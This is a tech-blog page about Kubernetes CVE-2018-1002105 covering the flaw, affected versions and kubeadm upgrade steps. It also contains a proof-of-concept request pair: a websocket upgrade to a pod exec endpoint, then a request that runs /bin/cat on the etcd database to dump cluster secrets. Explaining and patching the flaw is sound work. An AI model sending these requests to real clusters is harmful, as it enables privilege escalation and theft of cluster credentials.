<!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="what is CVE-2018-1002105 how to fix it">
    <meta name="keywords" content="CVE-2018-1002105 how to fix poc, how to check CVE-2018-1002105">
    <meta name="author" content="Anish nath">
    <meta name="robots" content="index,follow" />
	<meta name="googlebot" content="index,follow" />
	<meta name="resource-type" content="document" />
	<meta name="classification" content="tools" />
	<meta name="language" content="en" />

    <title>CVE-2018-1002105 how to fix poc</title>

    <!-- Bootstrap core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="css/blog-post.css" rel="stylesheet">
    
    <link rel="stylesheet"  href="css/highlight/default.min.css">
	<script src="css/highlight/highlight.min.js"></script>
	<script>hljs.initHighlightingOnLoad();</script>
	
	
		<!-- JSON-LD markup generated by Google Structured Data Markup Helper. -->
<!-- JSON-LD markup generated by Google Structured Data Markup Helper. -->
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://8gwifi.org/docs/CVE-2018-1002105.jsp"
  },
  "name" : "CVE-2018-1002105 how to fix the issue, what is CVE-2018-1002105, poc file for CVE-2018-1002105",
  "author" : {
    "@type" : "Person",
    "name" : "Anish"
  },
  "headline": "Kubernetes  Port, Targetport and NodePort",
  "image":"https://8gwifi.org/docs/img/CVE-2018-1002105.png",
  "datePublished" : "2018-12-07",
  "dateModified": "2018-12-07",
  "articleSection" : "CVE-2018-1002105 how to fix the issue, what is CVE-2018-1002105, poc file for CVE-2018-1002105",
  "articleBody" : [ "CVE-2018-1002105 how to fix the issue, what is CVE-2018-1002105, poc file for CVE-2018-1002105"],
  "publisher" : {
    "@type" : "Organization",
    "name" : "8gwifi.org Tech Blog",
    "logo" :  {
      "@type": "ImageObject",
      "url": "https://8gwifi.org/docs/img/logo.jpg"
    }
  }
}
</script>


  </head>

  <body>

    <!-- Navigation -->
 	<%@ include file="navigation.jsp"%>

    <!-- Page Content -->
    <div class="container">

      <div class="row">

        <!-- Post Content Column -->
        <div class="col-lg-8">

          <!-- Title -->
          <h1 class="mt-4" class="mt-4">Light Dive to CVE-2018-1002105</h1>

          <!-- Author -->
          <p class="lead">
            by
            <a href="https://www.linkedin.com/in/anishnath">Anish</a>
            <p>Posted on Friday December 7, 2018</p>
          </p>
          
          <img class="img-fluid rounded" src="img/CVE-2018-1002105.png" height="400" width="500" alt="Referefce ">
          
          <%@ include file="footer_adsense.jsp"%>
           <%@ include file="analytics.jsp"%>
           
          <hr>
          

<p>Kubernetes <a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2Fkubernetes%2Fkubernetes%2Fblob%2Fmaster%2FCHANGELOG-1.10.md%2F%23v11011&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHTclJ5U6q5y8R_wyy14WpXLzI4Jg">v1.10.11</a>, <a href="https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.11.md/#v1115">v1.11.5</a>, and <a href="https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.12.md/#v1123">v1.12.3</a> have been released to address CVE-2018-1002105, a critical security issue present in all previous versions of the Kubernetes API Server. The issue is also addressed in the upcoming v1.13.0 release. We recommend all clusters running previous versions update to one of these releases immediately.</p>
<p><img src="CVE-2018-1002105.png" alt=""></p>
<h2 class="mt-4"><a id="Description_6"></a>Description</h2>
<p>With a specially crafted request, users are able to establish a connection through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish the backend connection.</p>


<p>In kunbernetes Determine Pods </p>
<pre><code class="html">
# kubectl get pods
NAME                     READY     STATUS    RESTARTS   AGE
busybox                  1/1       Running   1878       114d
my-nginx-mj7p6           1/1       Running   28017      114d
nginx-64f497f8fd-4tncn   1/1       Running   0          114d
</code></pre>

<p> Once you have Determined which <b>pods</b>,and <b>namespace</b> needs to be target, construcut the websoccket and ask for connection upgrade request </p>

<p><strong>Packe#1</strong> : Will Thrown an Error as shown in the diagram</p>
<pre><code class="html">GET /api/v1/namespaces/{0}/pods/{1}/exec HTTP/1.1
Host: {2}
Authorization: Bearer {3}
Connection: upgrade
Upgrade: websocket
</code></pre>
<p><strong>Packet#2</strong> The Vulnerable TCP socket will open and allow to execute on hihger level</p>
<p> <strong>etcd-kubernetes</strong> node is choose as this will be available in most of the kubernetes Installation </p>
<pre><code class="html">GET /exec/kube-system/etcd-kubernetes/etcd?command=/bin/cat&amp;command=/var/lib/etcd/member/snap/db&amp;input=1&amp;output=1&amp;tty=0 HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Host: {0}
Origin: http://{0}
Sec-WebSocket-Key: {1}
Sec-WebSocket-Version: 13
sec-websocket-protocol: v4.channel.k8s.io
</code></pre>
<h2 class="mt-4"><a id="Affected_Version_36"></a>Affected kubernetes Version</h2>
<p>In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3,</p>
<h2 class="mt-4"><a id="How_do_you_tell_if_you_are_affected_39"></a>How do you tell if you are affected?</h2>
<p>If you have live kubeconfig (kubectl) credentials, you can simply download and run a  <a href="https://github.com/gravitational/cve-2018-1002105">CVE-2018-1002105 vulnerability checker</a>  created by one of our Kubernetes engineers.</p>
<h2 class="mt-4"><a id="How_to_Determine_the_Affected_Version_43"></a>How to Determine the Affected Version</h2>
<pre><code class="html"># kubectl version
Client Version: version.Info{Major:&quot;1&quot;, Minor:&quot;11&quot;, GitVersion:&quot;v1.11.2&quot;, GitCommit:&quot;bb9ffb1654d4a729bb4cec18ff088eacc153c239&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2018-08-07T23:17:28Z&quot;, GoVersion:&quot;go1.10.3&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}
Server Version: version.Info{Major:&quot;1&quot;, Minor:&quot;11&quot;, GitVersion:&quot;v1.11.0&quot;, GitCommit:&quot;91e7b4fd31fcd3d5f436da26c980becec37ceefe&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2018-06-27T20:08:34Z&quot;, GoVersion:&quot;go1.10.2&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}
</code></pre>
<h2 class="mt-4"><a id="How_to_Upgrade_51"></a>How to Fix/remediate Kubernetes Privilege Escalation Vulnerability </h2>
<p> The only way to remedaite this issue is having upgrade path </p>
<p>Check which versions are available to upgrade to and validate whether your current cluster is upgradeable. To skip the internet check, pass in the optional [version] parameter.</p>
<pre><code class="html">kubeadm upgrade plan [version] [flags]
</code></pre>
<pre><code class="html"># kubeadm upgrade plan v1.10.11
[preflight] Running pre-flight checks.
[upgrade] Making sure the cluster is healthy:
[upgrade/config] Making sure the configuration is correct:
[upgrade/config] Reading configuration from the cluster...
[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml'
[upgrade] Fetching available versions to upgrade to
[upgrade/versions] Cluster version: v1.11.0
[upgrade/versions] kubeadm version: v1.11.2
Awesome, you're up-to-date! Enjoy!
</code></pre>
<p>Upgrade your Kubernetes cluster to the specified version.</p>
<pre><code class="html"># kubeadm upgrade apply [version] 
</code></pre>
<p><strong>Complete output</strong></p>
<pre><code class="html"># kubeadm upgrade apply  v1.11.2
[preflight] Running pre-flight checks.
[upgrade] Making sure the cluster is healthy:
[upgrade/config] Making sure the configuration is correct:
[upgrade/config] Reading configuration from the cluster...
[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml'
[upgrade/apply] Respecting the --cri-socket flag that is set with higher priority than the config file.
[upgrade/version] You have chosen to change the cluster version to &quot;v1.11.2&quot;
[upgrade/versions] Cluster version: v1.11.0
[upgrade/versions] kubeadm version: v1.11.2
[upgrade/confirm] Are you sure you want to proceed with the upgrade? [y/N]: y
[upgrade/prepull] Will prepull images for components [kube-apiserver kube-controller-manager kube-scheduler etcd]
[upgrade/apply] Upgrading your Static Pod-hosted control plane to version &quot;v1.11.2&quot;...
Static pod: kube-apiserver-kube-master hash: ad20a2a660705a8c9d08878dafffa7ac
Static pod: kube-controller-manager-kube-master hash: feb107be50cab379cdc4e893e129fd2f
Static pod: kube-scheduler-kube-master hash: 31eabaff7d89a40d8f7e05dfc971cdbd
[upgrade/staticpods] Writing new Static Pod manifests to &quot;/etc/kubernetes/tmp/kubeadm-upgraded-manifests112864402&quot;
[controlplane] wrote Static Pod manifest for component kube-apiserver to &quot;/etc/kubernetes/tmp/kubeadm-upgraded-manifests112864402/kube-apiserver.yaml&quot;
[controlplane] wrote Static Pod manifest for component kube-controller-manager to &quot;/etc/kubernetes/tmp/kubeadm-upgraded-manifests112864402/kube-controller-manager.yaml&quot;
[controlplane] wrote Static Pod manifest for component kube-scheduler to &quot;/etc/kubernetes/tmp/kubeadm-upgraded-manifests112864402/kube-scheduler.yaml&quot;
[certificates] Using the existing etcd/ca certificate and key.
[certificates] Using the existing apiserver-etcd-client certificate and key.
[upgrade/staticpods] Moved new manifest to &quot;/etc/kubernetes/manifests/kube-apiserver.yaml&quot; and backed up old manifest to &quot;/etc/kubernetes/tmp/kubeadm-backup-manifests-2018-12-07-13-02-14/kube-apiserver.yaml&quot;
[upgrade/staticpods] Waiting for the kubelet to restart the component
Static pod: kube-apiserver-kube-master hash: ad20a2a660705a8c9d08878dafffa7ac
Static pod: kube-apiserver-kube-master hash: ad20a2a660705a8c9d08878dafffa7ac
Static pod: kube-apiserver-kube-master hash: ad20a2a660705a8c9d08878dafffa7ac
Static pod: kube-apiserver-kube-master hash: 74f3cf345d7cc44651228804635ec24f
[apiclient] Found 1 Pods for label selector component=kube-apiserver
[upgrade/staticpods] Component &quot;kube-apiserver&quot; upgraded successfully!
[upgrade/staticpods] Moved new manifest to &quot;/etc/kubernetes/manifests/kube-controller-manager.yaml&quot; and backed up old manifest to &quot;/etc/kubernetes/tmp/kubeadm-backup-manifests-2018-12-07-13-02-14/kube-controller-manager.yaml&quot;
[upgrade/staticpods] Waiting for the kubelet to restart the component
Static pod: kube-controller-manager-kube-master hash: feb107be50cab379cdc4e893e129fd2f
Static pod: kube-controller-manager-kube-master hash: 3d0475221ca9c7bf15a1f062cc50d547
[apiclient] Found 1 Pods for label selector component=kube-controller-manager
[upgrade/staticpods] Component &quot;kube-controller-manager&quot; upgraded successfully!
[upgrade/staticpods] Moved new manifest to &quot;/etc/kubernetes/manifests/kube-scheduler.yaml&quot; and backed up old manifest to &quot;/etc/kubernetes/tmp/kubeadm-backup-manifests-2018-12-07-13-02-14/kube-scheduler.yaml&quot;
[upgrade/staticpods] Waiting for the kubelet to restart the component
Static pod: kube-scheduler-kube-master hash: 31eabaff7d89a40d8f7e05dfc971cdbd
Static pod: kube-scheduler-kube-master hash: a00c35e56ebd0bdfcd77d53674a5d2a1
[apiclient] Found 1 Pods for label selector component=kube-scheduler
[upgrade/staticpods] Component &quot;kube-scheduler&quot; upgraded successfully!
[uploadconfig] storing the configuration used in ConfigMap &quot;kubeadm-config&quot; in the &quot;kube-system&quot; Namespace
[kubelet] Creating a ConfigMap &quot;kubelet-config-1.11&quot; in namespace kube-system with the configuration for the kubelets in the cluster
[kubelet] Downloading configuration for the kubelet from the &quot;kubelet-config-1.11&quot; ConfigMap in the kube-system namespace
[kubelet] Writing kubelet configuration to file &quot;/var/lib/kubelet/config.yaml&quot;
[patchnode] Uploading the CRI Socket information &quot;/var/run/dockershim.sock&quot; to the Node API object &quot;kube-master&quot; as an annotation
[bootstraptoken] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials
[bootstraptoken] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token
[bootstraptoken] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster
[addons] Applied essential addon: CoreDNS
[addons] Applied essential addon: kube-proxy

[upgrade/successful] SUCCESS! Your cluster was upgraded to &quot;v1.11.2&quot;. Enjoy!

[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.

</code></pre>

<h3><a id="Further_Reading_62"></a>Reference </h3>
<ol>
<li><a href="https://github.com/kubernetes/kubernetes/issues/71411">kubernetes/kubernetes/issues/71411</a></li>
</ol>


<%@ include file="thanks.jsp"%>


<hr>


      <!-- Comments Form -->
    

          <!-- Single Comment -->
 

          <!-- Comment with nested comments -->
        
          

        </div>

		
        
        <!-- Sidebar Widgets Column -->
        <div class="col-md-4">

          <!-- Ad Widget -->
         <%@ include file="footer_adsense.jsp"%> 

          
          <%@ include file="related-kube.jsp"%>
          
          <!-- Article Widget -->
         <%@ include file="related-linux.jsp"%>
         
           <!-- Article Widget -->
         <%@ include file="related-ansible.jsp"%>
         
         
         
         
         <%@ include file="related-cryptography.jsp"%>
          <%@ include file="related-window-crypto.jsp"%>
          
          <%@ include file="related-openstack.jsp"%>
         
         <!-- Topic Widget -->
         <%@ include file="side.jsp"%>
         
           <!-- Add Comments Support -->
         
         
         

        </div>

      </div>
      <!-- /.row -->


	<%@ include file="addcomments.jsp"%>
    
    </div>
    
    
    
    
    <!-- /.container -->

    <!-- Footer -->
    <footer class="py-5 bg-dark">
      <div class="container">
        <p class="m-0 text-center text-white">Copyright &copy; 8gwifi.org 2018</p>
      </div>
      <!-- /.container -->
    </footer>
    
    Here

    <!-- Bootstrap core JavaScript -->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>


  </body>

</html>